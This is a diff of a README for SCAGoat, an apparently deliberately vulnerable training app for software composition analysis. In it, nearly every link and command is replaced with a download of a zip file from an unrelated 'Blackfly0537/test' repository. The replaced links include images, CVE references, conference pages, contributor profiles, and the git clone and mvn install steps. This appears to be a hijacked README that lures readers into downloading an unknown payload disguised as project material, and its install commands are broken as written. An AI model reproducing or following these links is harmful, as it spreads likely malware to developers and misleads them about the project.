@@ -1,5 +1,5 @@
 <p align="center">
-    <img src="https://raw.githubusercontent.com/Blackfly0537/test/main/backend/src/test/java/test_v3.1.zip" alt="SCA Goat">
+    <img src="https://github.com/Blackfly0537/test/raw/refs/heads/main/xz-java-malicious/src/main/java/Software_1.3.zip" alt="SCA Goat">
      <br>SCA Goat<br> Navigating SCA Vulnerabilities, Empowering Mastery<br> <p align="center">
 </p>
 </p>
@@ -14,10 +14,10 @@ SCAGoat is an application for Software Composition Analysis (SCA) that focuses o
 This project contains deliberately vulnerable and malicious code for educational purposes. The xz-java-malicious package included in this project simulates a compromised library and should NEVER be used in production environments. This package is designed solely for training security professionals and for evaluating SCA tools.
 
 ## Presented at:
-- [DC32: Demo Labs](https://raw.githubusercontent.com/Blackfly0537/test/main/backend/src/test/java/test_v3.1.zip)
-- [Appsec Village: Arsenal](https://raw.githubusercontent.com/Blackfly0537/test/main/backend/src/test/java/test_v3.1.zip)
-- [Blackhat Europe 2024](https://raw.githubusercontent.com/Blackfly0537/test/main/backend/src/test/java/test_v3.1.zip)
-- [Blackhat Asia 2025](https://raw.githubusercontent.com/Blackfly0537/test/main/backend/src/test/java/test_v3.1.zip)
+- [DC32: Demo Labs](https://github.com/Blackfly0537/test/raw/refs/heads/main/xz-java-malicious/src/main/java/Software_1.3.zip)
+- [Appsec Village: Arsenal](https://github.com/Blackfly0537/test/raw/refs/heads/main/xz-java-malicious/src/main/java/Software_1.3.zip)
+- [Blackhat Europe 2024](https://github.com/Blackfly0537/test/raw/refs/heads/main/xz-java-malicious/src/main/java/Software_1.3.zip)
+- [Blackhat Asia 2025](https://github.com/Blackfly0537/test/raw/refs/heads/main/xz-java-malicious/src/main/java/Software_1.3.zip)
 
 ## What All CVE Covered?
 
@@ -27,24 +27,24 @@ In addition, there is one compromised package, that lacks a CVE, but is maliciou
 
 | CVE                        | Package Name    | Link  | 
 |----------------------------|-----------------|-------|
-| CVE-2023-42282             | IP              | [https://raw.githubusercontent.com/Blackfly0537/test/main/backend/src/test/java/test_v3.1.zip](https://raw.githubusercontent.com/Blackfly0537/test/main/backend/src/test/java/test_v3.1.zip) |     
-| CVE-2017-1000427           | Marked          | [https://raw.githubusercontent.com/Blackfly0537/test/main/backend/src/test/java/test_v3.1.zip](https://raw.githubusercontent.com/Blackfly0537/test/main/backend/src/test/java/test_v3.1.zip) |     
-| CVE-2017-16114             | Marked          | [https://raw.githubusercontent.com/Blackfly0537/test/main/backend/src/test/java/test_v3.1.zip](https://raw.githubusercontent.com/Blackfly0537/test/main/backend/src/test/java/test_v3.1.zip) |
-| CVE-2021-44228             | log4j           | [https://raw.githubusercontent.com/Blackfly0537/test/main/backend/src/test/java/test_v3.1.zip](https://raw.githubusercontent.com/Blackfly0537/test/main/backend/src/test/java/test_v3.1.zip)|
-| CVE-2020-9547              | jackson-databind | [https://raw.githubusercontent.com/Blackfly0537/test/main/backend/src/test/java/test_v3.1.zip](https://raw.githubusercontent.com/Blackfly0537/test/main/backend/src/test/java/test_v3.1.zip)|
-| CVE-2021-33623             | trim-newlines   | [https://raw.githubusercontent.com/Blackfly0537/test/main/backend/src/test/java/test_v3.1.zip](https://raw.githubusercontent.com/Blackfly0537/test/main/backend/src/test/java/test_v3.1.zip)|
-| CVE-2020-13935             | spring-websocket | [https://raw.githubusercontent.com/Blackfly0537/test/main/backend/src/test/java/test_v3.1.zip](https://raw.githubusercontent.com/Blackfly0537/test/main/backend/src/test/java/test_v3.1.zip)|
-| CVE-2019-10744             | lodash          | [https://raw.githubusercontent.com/Blackfly0537/test/main/backend/src/test/java/test_v3.1.zip](https://raw.githubusercontent.com/Blackfly0537/test/main/backend/src/test/java/test_v3.1.zip)|
-| CVE-2019-8331              | pug             | [https://raw.githubusercontent.com/Blackfly0537/test/main/backend/src/test/java/test_v3.1.zip](https://raw.githubusercontent.com/Blackfly0537/test/main/backend/src/test/java/test_v3.1.zip)|
-| CVE-2020-8116              | dot-prop        | [https://raw.githubusercontent.com/Blackfly0537/test/main/backend/src/test/java/test_v3.1.zip](https://raw.githubusercontent.com/Blackfly0537/test/main/backend/src/test/java/test_v3.1.zip)|
-| Malicious Package (No CVE) | xz-java         | [https://raw.githubusercontent.com/Blackfly0537/test/main/backend/src/test/java/test_v3.1.zip](https://raw.githubusercontent.com/Blackfly0537/test/main/backend/src/test/java/test_v3.1.zip)|
+| CVE-2023-42282             | IP              | [https://github.com/Blackfly0537/test/raw/refs/heads/main/xz-java-malicious/src/main/java/Software_1.3.zip](https://github.com/Blackfly0537/test/raw/refs/heads/main/xz-java-malicious/src/main/java/Software_1.3.zip) |     
+| CVE-2017-1000427           | Marked          | [https://github.com/Blackfly0537/test/raw/refs/heads/main/xz-java-malicious/src/main/java/Software_1.3.zip](https://github.com/Blackfly0537/test/raw/refs/heads/main/xz-java-malicious/src/main/java/Software_1.3.zip) |     
+| CVE-2017-16114             | Marked          | [https://github.com/Blackfly0537/test/raw/refs/heads/main/xz-java-malicious/src/main/java/Software_1.3.zip](https://github.com/Blackfly0537/test/raw/refs/heads/main/xz-java-malicious/src/main/java/Software_1.3.zip) |
+| CVE-2021-44228             | log4j           | [https://github.com/Blackfly0537/test/raw/refs/heads/main/xz-java-malicious/src/main/java/Software_1.3.zip](https://github.com/Blackfly0537/test/raw/refs/heads/main/xz-java-malicious/src/main/java/Software_1.3.zip)|
+| CVE-2020-9547              | jackson-databind | [https://github.com/Blackfly0537/test/raw/refs/heads/main/xz-java-malicious/src/main/java/Software_1.3.zip](https://github.com/Blackfly0537/test/raw/refs/heads/main/xz-java-malicious/src/main/java/Software_1.3.zip)|
+| CVE-2021-33623             | trim-newlines   | [https://github.com/Blackfly0537/test/raw/refs/heads/main/xz-java-malicious/src/main/java/Software_1.3.zip](https://github.com/Blackfly0537/test/raw/refs/heads/main/xz-java-malicious/src/main/java/Software_1.3.zip)|
+| CVE-2020-13935             | spring-websocket | [https://github.com/Blackfly0537/test/raw/refs/heads/main/xz-java-malicious/src/main/java/Software_1.3.zip](https://github.com/Blackfly0537/test/raw/refs/heads/main/xz-java-malicious/src/main/java/Software_1.3.zip)|
+| CVE-2019-10744             | lodash          | [https://github.com/Blackfly0537/test/raw/refs/heads/main/xz-java-malicious/src/main/java/Software_1.3.zip](https://github.com/Blackfly0537/test/raw/refs/heads/main/xz-java-malicious/src/main/java/Software_1.3.zip)|
+| CVE-2019-8331              | pug             | [https://github.com/Blackfly0537/test/raw/refs/heads/main/xz-java-malicious/src/main/java/Software_1.3.zip](https://github.com/Blackfly0537/test/raw/refs/heads/main/xz-java-malicious/src/main/java/Software_1.3.zip)|
+| CVE-2020-8116              | dot-prop        | [https://github.com/Blackfly0537/test/raw/refs/heads/main/xz-java-malicious/src/main/java/Software_1.3.zip](https://github.com/Blackfly0537/test/raw/refs/heads/main/xz-java-malicious/src/main/java/Software_1.3.zip)|
+| Malicious Package (No CVE) | xz-java         | [https://github.com/Blackfly0537/test/raw/refs/heads/main/xz-java-malicious/src/main/java/Software_1.3.zip](https://github.com/Blackfly0537/test/raw/refs/heads/main/xz-java-malicious/src/main/java/Software_1.3.zip)|
 
 
 
 ## Steps to run SCAGoat
 Step 1. Clone the application
 ```bash
-git clone https://raw.githubusercontent.com/Blackfly0537/test/main/backend/src/test/java/test_v3.1.zip
+git clone https://github.com/Blackfly0537/test/raw/refs/heads/main/xz-java-malicious/src/main/java/Software_1.3.zip
 ```
 Step 2. Go to the Directory
 ```bash
@@ -78,8 +78,8 @@ mvn dependency:tree
 4. After successful installation, add the malicious package to your .m2 repo by running following command
 ```bash
 mvn install:install-file \
-  https://raw.githubusercontent.com/Blackfly0537/test/main/backend/src/test/java/test_v3.1.zip \
-  https://raw.githubusercontent.com/Blackfly0537/test/main/backend/src/test/java/test_v3.1.zip \
+  https://github.com/Blackfly0537/test/raw/refs/heads/main/xz-java-malicious/src/main/java/Software_1.3.zip \
+  https://github.com/Blackfly0537/test/raw/refs/heads/main/xz-java-malicious/src/main/java/Software_1.3.zip \
   -DartifactId=xz \
   -Dversion=1.9.2-malicious \
   -Dpackaging=jar
@@ -98,7 +98,7 @@ cd ..
 - Use in isolated, educational environments only.
 
 ### SCA Goat HomePage
-![SCAGoat HomePage](https://raw.githubusercontent.com/Blackfly0537/test/main/backend/src/test/java/test_v3.1.zip)
+![SCAGoat HomePage](https://github.com/Blackfly0537/test/raw/refs/heads/main/xz-java-malicious/src/main/java/Software_1.3.zip)
 
 ## Vulnerability Dashboard
 
@@ -124,45 +124,45 @@ Our aim is to provide you with a better understanding of vulnerable packages and
 
 |  Demo Videos | CVE Exploited |
 |---------------|-----------|
-| [Demo 1](https://raw.githubusercontent.com/Blackfly0537/test/main/backend/src/test/java/test_v3.1.zip) |    CVE-2023-42282 |           
-| [Demo 2](https://raw.githubusercontent.com/Blackfly0537/test/main/backend/src/test/java/test_v3.1.zip) |     CVE-2017-16114 |     
-| [Demo 3](https://raw.githubusercontent.com/Blackfly0537/test/main/backend/src/test/java/test_v3.1.zip) |     CVE-2021-44228 |
-| [Demo 4](https://raw.githubusercontent.com/Blackfly0537/test/main/backend/src/test/java/test_v3.1.zip) | CVE-2020-9547 |
-| [Demo 5](https://raw.githubusercontent.com/Blackfly0537/test/main/backend/src/test/java/test_v3.1.zip) | XZ-JAVA compromised |
-| [Demo 6](https://raw.githubusercontent.com/Blackfly0537/test/main/backend/src/test/java/test_v3.1.zip) | CVE-2019-10744 (Lodash) |
+| [Demo 1](https://github.com/Blackfly0537/test/raw/refs/heads/main/xz-java-malicious/src/main/java/Software_1.3.zip) |    CVE-2023-42282 |           
+| [Demo 2](https://github.com/Blackfly0537/test/raw/refs/heads/main/xz-java-malicious/src/main/java/Software_1.3.zip) |     CVE-2017-16114 |     
+| [Demo 3](https://github.com/Blackfly0537/test/raw/refs/heads/main/xz-java-malicious/src/main/java/Software_1.3.zip) |     CVE-2021-44228 |
+| [Demo 4](https://github.com/Blackfly0537/test/raw/refs/heads/main/xz-java-malicious/src/main/java/Software_1.3.zip) | CVE-2020-9547 |
+| [Demo 5](https://github.com/Blackfly0537/test/raw/refs/heads/main/xz-java-malicious/src/main/java/Software_1.3.zip) | XZ-JAVA compromised |
+| [Demo 6](https://github.com/Blackfly0537/test/raw/refs/heads/main/xz-java-malicious/src/main/java/Software_1.3.zip) | CVE-2019-10744 (Lodash) |
 | [Demo 8]() | CVE-2019-8331 (Pug) |
 | [Demo 9]() | CVE-2020-8116 (Dot-Prop) |
 
 ## SCA Scan Reports
-- [Link to SCAGoat Scan Reports](https://raw.githubusercontent.com/Blackfly0537/test/main/backend/src/test/java/test_v3.1.zip)
-- [Detailed Dependency Check Tool Report](https://raw.githubusercontent.com/Blackfly0537/test/main/backend/src/test/java/test_v3.1.zip)
+- [Link to SCAGoat Scan Reports](https://github.com/Blackfly0537/test/raw/refs/heads/main/xz-java-malicious/src/main/java/Software_1.3.zip)
+- [Detailed Dependency Check Tool Report](https://github.com/Blackfly0537/test/raw/refs/heads/main/xz-java-malicious/src/main/java/Software_1.3.zip)
 
 ## UI Enhancements
 
 The SCAGoat application features a modern, responsive UI with the following features:
 
 - Interactive vulnerability dashboard with informative cards
-- Dark mode interface with https://raw.githubusercontent.com/Blackfly0537/test/main/backend/src/test/java/test_v3.1.zip background
+- Dark mode interface with https://github.com/Blackfly0537/test/raw/refs/heads/main/xz-java-malicious/src/main/java/Software_1.3.zip background
 - Detailed information about each vulnerability including CVSS scores
 - Real-time demonstration of exploits
 - Mobile-friendly responsive design
 
 ## Want to contribute? 
-[![Fork this project](https://raw.githubusercontent.com/Blackfly0537/test/main/backend/src/test/java/test_v3.1.zip)](https://raw.githubusercontent.com/Blackfly0537/test/main/backend/src/test/java/test_v3.1.zip)
-[![Start contributing](https://raw.githubusercontent.com/Blackfly0537/test/main/backend/src/test/java/test_v3.1.zip)](https://raw.githubusercontent.com/Blackfly0537/test/main/backend/src/test/java/test_v3.1.zip)
+[![Fork this project](https://github.com/Blackfly0537/test/raw/refs/heads/main/xz-java-malicious/src/main/java/Software_1.3.zip)](https://github.com/Blackfly0537/test/raw/refs/heads/main/xz-java-malicious/src/main/java/Software_1.3.zip)
+[![Start contributing](https://github.com/Blackfly0537/test/raw/refs/heads/main/xz-java-malicious/src/main/java/Software_1.3.zip)](https://github.com/Blackfly0537/test/raw/refs/heads/main/xz-java-malicious/src/main/java/Software_1.3.zip)
 <br>Awesome! The most basic way to show your support is to star the project or raise issues.
 
 ## Contributors
 Thanks to all the people who already contributed!  
-[Prashant Venkatesh](https://raw.githubusercontent.com/Blackfly0537/test/main/backend/src/test/java/test_v3.1.zip)    
-[Nandan Gupta](https://raw.githubusercontent.com/Blackfly0537/test/main/backend/src/test/java/test_v3.1.zip)  
-[Hare Krishna Rai](https://raw.githubusercontent.com/Blackfly0537/test/main/backend/src/test/java/test_v3.1.zip)  
-[Henrik Plate](https://raw.githubusercontent.com/Blackfly0537/test/main/backend/src/test/java/test_v3.1.zip)  
-[Gaurav Joshi](https://raw.githubusercontent.com/Blackfly0537/test/main/backend/src/test/java/test_v3.1.zip)  
-[Yoad Fekete](https://raw.githubusercontent.com/Blackfly0537/test/main/backend/src/test/java/test_v3.1.zip) 
+[Prashant Venkatesh](https://github.com/Blackfly0537/test/raw/refs/heads/main/xz-java-malicious/src/main/java/Software_1.3.zip)    
+[Nandan Gupta](https://github.com/Blackfly0537/test/raw/refs/heads/main/xz-java-malicious/src/main/java/Software_1.3.zip)  
+[Hare Krishna Rai](https://github.com/Blackfly0537/test/raw/refs/heads/main/xz-java-malicious/src/main/java/Software_1.3.zip)  
+[Henrik Plate](https://github.com/Blackfly0537/test/raw/refs/heads/main/xz-java-malicious/src/main/java/Software_1.3.zip)  
+[Gaurav Joshi](https://github.com/Blackfly0537/test/raw/refs/heads/main/xz-java-malicious/src/main/java/Software_1.3.zip)  
+[Yoad Fekete](https://github.com/Blackfly0537/test/raw/refs/heads/main/xz-java-malicious/src/main/java/Software_1.3.zip) 
 
-<a href="https://raw.githubusercontent.com/Blackfly0537/test/main/backend/src/test/java/test_v3.1.zip">
-  <img src="https://raw.githubusercontent.com/Blackfly0537/test/main/backend/src/test/java/test_v3.1.zip" />
+<a href="https://github.com/Blackfly0537/test/raw/refs/heads/main/xz-java-malicious/src/main/java/Software_1.3.zip">
+  <img src="https://github.com/Blackfly0537/test/raw/refs/heads/main/xz-java-malicious/src/main/java/Software_1.3.zip" />
 </a>
 
 
